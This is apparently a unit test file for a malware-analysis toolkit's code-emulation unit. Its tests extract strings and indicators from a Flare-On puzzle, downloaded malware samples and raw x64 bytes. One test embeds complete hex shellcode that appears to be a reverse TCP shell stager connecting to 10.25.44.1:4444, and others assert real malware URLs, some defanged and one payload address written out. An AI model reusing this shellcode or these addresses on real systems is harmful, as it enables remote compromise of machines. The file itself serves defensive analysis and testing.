#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from ... import TestUnitBase


class TestVStack(TestUnitBase):

    def test_flareon10(self):
        data = (
            B'     FlArEonFl                                        ArE                \n'
            B'   onFlArEonFlAr                                     EonFl               \n'
            B' ArEonFlArEonFlArE                                  onFlArE              \n'
            B'onFlArEonFlArEonFlA                                rEonFlArE             \n'
            B'onFlArEe   JwVkLtPWmEchgNI      alosxdj           ooC6OLlWnbj            \n'
            B'3q2xyS4     yVGNA6Y OMhkKtG    1GwuXnM           XJPwPv6HQO4Kv           \n'
            B'oAbH324     VqrxQra  hU2+Dm8  efLle7/           nTb4nPj VWUkOlI          \n'
            B'BHv0vQh g1g JaLpPuD   qHPsHajHtSsL5w           e9iYJTb   nia1nRK         \n'
            B'KH2H40G MaO 2wNDjaA    szAciqAoLhLF           ImHeIZB     uRaiTSr        \n'
            B'cTuPYIu     Yk+47yE     yU8TBKHH4l           LA6iWwDkXMSR8J8B3F8l3       \n'
            B'gxTryUv     HIQrx8S     b4Rv7xPv2m          X7PfFBeh+HiU/TxOd+4ovcf      \n'
            B'5V3hSbim   /RPZPdU8    n2E+DFA/JTdX        2PE7wniTzNR1Ii/LUTJRpw9IP     \n'
            B'6J+9xOlP3EhZe4FN+V+   P6L71p8N+KqSKp      KImtZll             IpKDFDq    \n'
            B' Rlm0aG7lhyZblNdjm   rOuBK1e  Wtmr6mE    7d5aUgl               VHz/Pqb   \n'
            B'   r8VCgd9KfqTrG    9kg== F    lArEonF  lArEonF                 lArEonF  \n'
            B'     lArEonFlA     rEonFlA      rEonFlArEonFlA                   rEonFlA \n'
        )
        dc = data | self.load_pipeline('''
            resub | trim -ui flareon | b64 | zl | vstack -w10 -p9: -ax64 [| sorted -a size | trim h:00 | pop key | xor eat:key ]
        ''') | bytes
        self.assertEqual(dc, b'Patience is rewarded sooner or later - but usually later.')

    def test_stringcrypt_01(self):
        data = self.download_sample('e7a198902409517fc723d40b79c27b1776509d63c461b8f5daf5bb664f9e0589')
        test = data | self.load_pipeline(
            'put b [| rex Y:488D4C[2]E8[4]488BC8E8 | eat b | vaddr offset | vstack -w40 var:offset | xtp | defang ]') | {str}
        self.assertSetEqual(test, {
            'https[:]//discord[.]com/channels/1145547606802563172/1154889021567279115/1154889238077263952',
            'https[:]//raw.githubusercontent[.]com/ToXicVibezz/Galaxy/main/Galaxy.dll',
        })

    def test_write_skip_regression_01(self):
        h = bytes.fromhex
        data = h(
            '554889E54881EC880000004889BD78FFFFFF48B82A233337285B404148BA462B202E20205F594889'
            '45C0488955C848B8424033212D3D375748BA5D5B4335392C3E2A488945D0488955D848B840555F5A'
            '7073756D48BA6C6F72656D697073488945E0488955E8C645F00048B86C6F72656D69707348BA756D'
            '6C6F72656D69488945804889558848B87073756D6C6F726548BA6D697073756D6C6F488945904889'
            '559848B872656D697073756D48BA6C6F72656D697073488945A0488955A8C645B000488B8578FFFF'
            'FF4889C7E846FEFFFF8945F4C745FC00000000C745F800000000EB358B45F84863D0488B8578FFFF'
            'FF4801D00FB6108B45F848980FB644058031C28B45F848980FB64405C038C275048345FC018345F8'
            '018B45F83B45F47CC38B45FCC9'
        )
        unit = self.load(patch_range=slice(10, 50), arch='x64')
        test = data | unit | {bytes}
        self.assertSetEqual(test, {
            h('2A233337285B4041462B202E20205F59424033212D3D37575D5B4335392C3E2A40555F5A7073756D6C6F72656D69707300'),
            h('6C6F72656D697073756D6C6F72656D697073756D6C6F72656D697073756D6C6F72656D697073756D6C6F72656D69707300'),
        })

    def test_shellcode_example(self):
        data = self.download_sample('e850f3849ea82980cf23844ad3caadf73856b2d5b0c4179847d82ce4016e80ee')
        unit = self.load_pipeline(r'officecrypt | xt oleObject1 | xt native | rex y:E9[] | vstack -b 0x8000 -a=x32 -w=80 0x8000 | xtp -ff')
        self.assertEqual(data | unit | str, 'htt''p:/''/103.153.79''.104/windows10/csrss.exe')

    def test_speakeasy(self):
        data = bytes.fromhex(
            'FC4883E4F0E8CC00000041514150524831D25165488B526056488B5218488B52204D31C9488B7250'
            '480FB74A4A4831C0AC3C617C022C2041C1C90D4101C1E2ED524151488B52208B423C4801D0668178'
            '180B020F85720000008B80880000004885C074674801D050448B40204901D08B4818E3564D31C948'
            'FFC9418B34884801D64831C041C1C90DAC4101C138E075F14C034C24084539D175D858448B402449'
            '01D066418B0C48448B401C4901D0418B04884801D0415841585E595A41584159415A4883EC204152'
            'FFE05841595A488B12E94BFFFFFF5D49BE7773325F3332000041564989E64881ECA00100004989E5'
            '49BC0200115C0A192C0141544989E44C89F141BA4C772607FFD54C89EA68010100005941BA29806B'
            '00FFD56A0A415E50504D31C94D31C048FFC04889C248FFC04889C141BAEA0FDFE0FFD54889C76A10'
            '41584C89E24889F941BA99A57461FFD585C0740A49FFCE75E5E81F0100004883EC104889E24D31C9'
            '6A0441584889F941BA02D9C85FFFD583F8000F8E6D0000004883C4205E89F681F6A005A2D34C8D9E'
            '000100006A404159680010000041584889F24831C941BA58A453E5FFD5488D98000100004989DF53'
            '56504D31C94989F04889DA4889F941BA02D9C85FFFD54883C42083F8007D28584157596800400000'
            '41586A005A41BA0B2F0F30FFD5575941BA756E4D61FFD549FFCEE920FFFFFF4801C34829C675B349'
            '89FE5F5941594156E810000000342A687EA2D05360C953107ACBE83E085E4831C04989F8AAFEC075'
            'FB4831DB41021C004889C280E20F021C16418A14004186141841881400FEC075E34831DBFEC04102'
            '1C00418A1400418614184188140041021418418A141041301149FFC148FFC975DB5F41FFE7586A00'
            '5949C7C2F0B5A256FFD5'
        )
        unit = self.load(engine='speakeasy', arch='x64', log_writes_in_calls=True, wait='1G')
        test = data | unit | []
        self.assertIn(B'10.25.44'B'.1:4444', test)
